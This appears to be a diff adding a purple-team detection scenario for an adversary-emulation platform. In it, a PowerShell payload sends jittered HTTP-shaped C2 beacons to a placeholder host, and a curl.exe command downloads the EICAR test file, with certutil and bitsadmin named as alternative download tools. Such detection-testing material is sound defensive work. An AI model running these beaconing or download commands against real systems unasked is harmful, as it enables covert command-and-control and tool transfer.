+   "inject_depends_duration": 240,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "C2 beacon (http-shaped)",
+      "fr": "C2 beacon (http-shaped)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "a5637388-8f20-590c-b818-077ea175635f",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "46b374c8-abc0-5c6b-babd-b8899d0dcd38",
+    "injector_contract_labels": {
+     "en": "C2 beacon (http-shaped)",
+     "fr": "C2 beacon (http-shaped)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"C2 beacon (http-shaped)\",\"fr\":\"C2 beacon (http-shaped)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"a5637388-8f20-590c-b818-077ea175635f\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "37b54b3d-a3ed-550c-9e4a-a7395f42673e",
+     "payload_type": "Command",
+     "payload_name": "wetland — C2 beacon (http-shaped)",
+     "payload_description": "Mirrors `wld lab beacon --as http` on Windows: five jittered outbound check-ins shaped as HTTP GET with a fixed browser User-Agent. EDIT the $C2 line to your wetland relay/tunnel host:port. Detection: beaconing regularity, fixed UA, low bytes-up/down (NetFlow/Zeek).",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": null,
+     "payload_cleanup_command": null,
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "80cf781a-6928-538a-aa1f-9348cdc052f7",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$C2 = 'example.com:443'   # <-- EDIT: your wetland relay/tunnel host:port\n$h,$p = $C2.Split(':'); if (-not $p) { $p = 443 }\nfor ($i=1; $i -le 5; $i++) {\n  try {\n    $c = New-Object Net.Sockets.TcpClient; $c.Connect($h,[int]$p)\n    $req = \"GET /{0:x8} HTTP/1.1`r`nHost: {1}`r`nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`r`nAccept: */*`r`n`r`n\" -f (Get-Random),$h\n    $b = [Text.Encoding]::ASCII.GetBytes($req); $c.GetStream().Write($b,0,$b.Length); $c.Close()\n    Write-Output \"WETLAND-LAB beacon #${i}: check-in to ${h}:${p} (http-shaped)\"\n  } catch { Write-Output \"WETLAND-LAB beacon #${i}: ${h}:${p} unreachable\" }\n  Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 10)\n}\nWrite-Output 'detect: periodic outbound to one host; fixed UA; beaconing regularity (NetFlow/Zeek)'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "db955c30-1814-57a0-bdd7-b34abca0b087",
+      "attack_pattern_name": "Web Protocols",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1071.001",
+      "attack_pattern_kill_chain_phases": []
+     },
+     {
+      "attack_pattern_id": "d3a51c46-d9f7-519e-b027-84830570ec92",
+      "attack_pattern_name": "Non-Standard Port",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1571",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "a5637388-8f20-590c-b818-077ea175635f",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
+   "inject_id": "dc8aa719-593a-5ac2-a01a-d3db9a8fbfe4",
+   "inject_title": "Ingress Tool Transfer — benign EICAR download test (T1105)",
+   "inject_description": "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 300,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Ingress tool transfer (EICAR)",
+      "fr": "Ingress tool transfer (EICAR)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "8a25fab1-db21-5677-a064-99639c8d8215",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "eb43ee82-81ce-506c-8910-9bcd355dac50",
+    "injector_contract_labels": {
+     "en": "Ingress tool transfer (EICAR)",
+     "fr": "Ingress tool transfer (EICAR)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Ingress tool transfer (EICAR)\",\"fr\":\"Ingress tool transfer (EICAR)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"8a25fab1-db21-5677-a064-99639c8d8215\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "d988f8bb-1818-5276-a4ec-8b5f83e63b05",
+     "payload_type": "Command",
+     "payload_name": "wetland — Ingress tool transfer (EICAR)",
+     "payload_description": "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "Remove-Item (Join-Path $env:TEMP 'wetland-lab-eicar.txt') -Force -ErrorAction SilentlyContinue\nWrite-Output 'WETLAND-LAB ingress: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "47942c3b-6105-5de5-b605-b4104f4a38e8",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$dst = Join-Path $env:TEMP 'wetland-lab-eicar.txt'\ncurl.exe -s -o $dst https://secure.eicar.org/eicar.com.txt\nif (Test-Path $dst) {\n  Write-Output \"WETLAND-LAB ingress: downloaded EICAR test file via curl.exe -> $dst (T1105)\"\n} else {\n  Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — that is a valid detection'\n}\nWrite-Output 'detect: curl.exe writing a known-bad to disk; proxy/NDR tool transfer; AV on-write'\nWrite-Output 'alt LOLBins to test: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "9b8e4bdb-fbbd-5cbd-acf2-e604fedc49e2",
+      "attack_pattern_name": "Ingress Tool Transfer",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1105",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "8a25fab1-db21-5677-a064-99639c8d8215",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  }
+ ],
+ "scenario_tags": [],
+ "scenario_documents": [],
+ "scenario_channels": [],
+ "scenario_articles": [],
+ "scenario_challenges": [],
+ "scenario_lessons_categories": [],
+ "scenario_lessons_questions": [],
+ "scenario_variables": []
+}
